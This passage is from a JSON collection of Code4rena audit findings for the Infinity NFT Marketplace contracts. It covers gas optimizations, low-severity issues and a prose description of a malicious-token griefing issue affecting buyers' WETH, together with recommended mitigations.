vestedSixMonths,uint256 vestedTwelveMonths](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L291-L296)\\\n[address user](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L328)\\\n[address destination](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\\\n[StakeLevel stakeLevel, uint16 threshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[uint16 threeMonthPenalty,uint16 sixMonthPenalty,uint16 twelveMonthPenalty](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L365-L367)\\\n[address \\_infinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd a comment for these parameters\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5533",
      "title": "[G-15] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-15-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5532",
      "title": "[G-11] `>=` costs less gas than `>`",
      "impact": "GAS",
      "content": "\nThe compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/token/InfinityToken.sol   #1\n\n67        epochsPassedSinceLastAdvance = epochsPassedSinceLastAdvance > epochsLeft\n68          ? epochsLeft\n69:         : epochsPassedSinceLastAdvance;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L67-L69>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-11--costs-less-gas-than-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5531",
      "title": "[G-10] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "\nThis change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n392:      require(numNonces > 0, 'cannot be empty');\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L392>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-10-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5530",
      "title": "[G-09] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27><br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-09-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5529",
      "title": "[G-08] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5528",
      "title": "[G-06] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 22 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-06-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4963",
      "title": "[G-19] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 13 instances of this issue.*\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1163502067):**\n > Thank you for the detailed report.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1184785713):**\n > 🔥 \n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-19-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4962",
      "title": "[G-18] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**\\~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hitby [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 47 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-18-use-custom-errors-rather-than-revertrequire-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4961",
      "title": "[G-17] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-17-empty-blocks-should-be-removed-or-emit-something",
      "tags": [],
      "finders": []
    },
    {
      "id": "4960",
      "title": "[G-16] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n*There are 6 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-16-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4958",
      "title": "[G-14] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n*There are 39 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-14-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4957",
      "title": "[G-13] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-13-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4956",
      "title": "[G-12] It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\nNot overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings\n\n*There are 26 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-12-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied",
      "tags": [],
      "finders": []
    },
    {
      "id": "4951",
      "title": "[G-07] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-07-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "4949",
      "title": "[G-05] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **\\~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-05-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache",
      "tags": [],
      "finders": []
    },
    {
      "id": "4948",
      "title": "[G-04] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 9 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4947",
      "title": "[G-03] State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/staking/InfinityStaker.sol   #1\n\n/// @audit Variable ordering with 3 slots instead of the current 4:\n/// @audit  mapping(32):userstakedAmounts, address(20):INFINITY_TOKEN, uint16(2):BRONZE_STAKE_THRESHOLD, uint16(2):SILVER_STAKE_THRESHOLD, uint16(2):GOLD_STAKE_THRESHOLD, uint16(2):PLATINUM_STAKE_THRESHOLD, uint16(2):THREE_MONTH_PENALTY, uint16(2):SIX_MONTH_PENALTY, address(20):INFINITY_TREASURY, uint16(2):TWELVE_MONTH_PENALTY\n23:     mapping(address => mapping(Duration => StakeAmount)) public userstakedAmounts;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L23>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-03-state-variables-can-be-packed-into-fewer-storage-slots",
      "tags": [],
      "finders": []
    },
    {
      "id": "4946",
      "title": "[G-02] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).\n\n*There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, see the warden's [full report](https://github.com/code-423n4/2022-06-infinity-findings/issues/186).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-02-state-variables-only-set-in-the-constructor-should-be-declared-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4945",
      "title": "[G-01] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **\\~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n70      mapping(address => uint256) public userMinOrderNonce;\n71    \n72      /// @dev This records already executed or cancelled orders to prevent replay attacks.\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L70-L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "4944",
      "title": "[L-07] Timelock or maximum amount on updatePenalties",
      "impact": "LOW",
      "content": "\n`updatePenalties()` changes how much a user loses upon \"ragequiting\" - ie withdrawing their tokens from the staker without waiting for the vesting period. It currently does not have any timelock, or any maximum amount: the owner can set the penalties such that a user calling `rageQuit()` loses all their `Infinity` tokens (all would be transferred to `INFINITY_TREASURY`). Adding a timelock would provide more guarantees to users and reduces the level of trust required.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L369-L371)\n\n### Mitigation\n\nEither add a timelock to `updatePenalties()`, or add a maximum penalty check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-07-timelock-or-maximum-amount-on-updatepenalties",
      "tags": [],
      "finders": []
    },
    {
      "id": "4943",
      "title": "[L-06] Setters should check the input value",
      "impact": "LOW",
      "content": "\nSetters should check the input value - ie make revert if it is the zero address or zero\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351) There should be a check that the new threshold does not break the following: BRONZE < SILVER < GOLD < PLATINUM\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd non-zero checks - address or uint - to the setters aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-06-setters-should-check-the-input-value",
      "tags": [],
      "finders": []
    },
    {
      "id": "4942",
      "title": "[L-05] Receive function",
      "impact": "LOW",
      "content": "\nInfinityStaker.sol is not supposed to receive ETH. Instead of using a rescue function, remove `receive()` and `fallback()` altogether.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[fallback() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L55)\\\n[receive() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L57)\\\n[function rescueETH(address destination) external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\n\n### Mitigation\n\nRemove these functions, or include a call to `rescueETH` in `receive()`, so that a user that mistakenly sends ETH to the Staker retrieves it immediately.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-05-receive-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4941",
      "title": "[L-04] Payable functions when using ERC20",
      "impact": "LOW",
      "content": "\nThere should be a `require(0 == msg.value)` to ensure no Ether is being sent to the exchange when the currency used in an order is a ERC20 token.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nscope: `takeMultipleOneOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L305-L307), there is no check to see if `msg.value == 0`\n\nscope: `takeOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L346-L348), there is no check to see if `msg.value == 0`\n\n### Mitigation\n\nAdd `require(0 == msg.value)` in both condition blocks mentioned above.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-04-payable-functions-when-using-erc20",
      "tags": [],
      "finders": []
    },
    {
      "id": "4940",
      "title": "[L-03] Immutable addresses lack zero-address check",
      "impact": "LOW",
      "content": "\nConstructors should check the address written in an immutable address variable is not the zero address\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[WETH = \\_WETH](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L115)\n\n### Mitigation\n\nAdd a zero address check for `_WETH`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-03-immutable-addresses-lack-zero-address-check",
      "tags": [],
      "finders": []
    },
    {
      "id": "4939",
      "title": "[L-02] Check zero denominator",
      "impact": "LOW",
      "content": "\nWhen a division is computed, it must be ensured that the denominator is non-zero to prevent failure of the function call.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[((threeMonthLock - threeMonthVested) / THREE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L196)\\\n[((sixMonthLock - sixMonthVested) / SIX_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L197)\\\n[((twelveMonthLock - twelveMonthVested) / TWELVE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L198)\n\nAll these storage variables in the denominators are set by the owner in `updatePenalties()`, and can be `0` as there is no non-zero check.\n\n### Mitigation\n\nBefore doing these computations, add a non-zero check to these variables. Or alternatively, add a non-zero check in\n`updatePenalties()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-02-check-zero-denominator",
      "tags": [],
      "finders": []
    },
    {
      "id": "4938",
      "title": "[L-01] Event should be emitted in setters",
      "impact": "LOW",
      "content": "\nSetters should emit an event so that Dapps can detect important changes to storage.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nAll the functions editing the currencies and complications of the exchange should emit an event\\\n[function addCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function addComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1240)\\\n[function removeCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function removeComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nEmit an event in all setters.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-01-event-should-be-emitted-in-setters",
      "tags": [],
      "finders": []
    },
    {
      "id": "2786",
      "title": "[M-09] Malicious tokens can be used to grief buyers and cause loss of their WETH balance",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xalpharush_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L746>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L727>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1087>\n\n### Impact\n\nThe function `matchOneToOneOrders` transfers an arbitrary amount of WETH from the user, `buy.signer` ,  in its inner call to `_execMatchOneToOneOrders`. The amount charged to the user is calculated dynamically based off of the gas consumption consumed during the trace. Notably, this amount is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. For example, when a user purchases an ERC721 token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas. This scenario is unlikely given that a buyer would have to purchase a malicious token, but the impact would be devastating as any WETH that the buyer has approved to the exchange can be lost.\n\nThis vulnerability is potentially possible in these functions as well:<br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L236-L242><br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L787-L796>\n\n### Proof of Concept\n\nA buyer gives infinite WETH approval to the exchange contract and unknowingly purchases a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes *all* of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\n### Recommended Mitigation Steps\n\nAllow users to input a maximum fee/ gas cost they are willing to spend on each order. Pulling an arbitrary amount from a 